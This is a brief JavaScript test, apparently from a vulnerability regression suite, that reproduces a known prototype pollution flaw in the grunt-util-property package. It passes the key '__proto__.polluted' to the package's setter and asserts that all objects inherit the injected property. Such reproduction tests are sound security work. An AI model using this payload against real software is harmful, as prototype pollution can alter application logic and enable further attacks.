//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
test("prototype pollution in grunt-util-property", () => {
  const grunt = require("grunt");
  const a = require("grunt-util-property");

  expect({}.polluted).toBe(undefined);

  let b = a(grunt);
  b.call({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
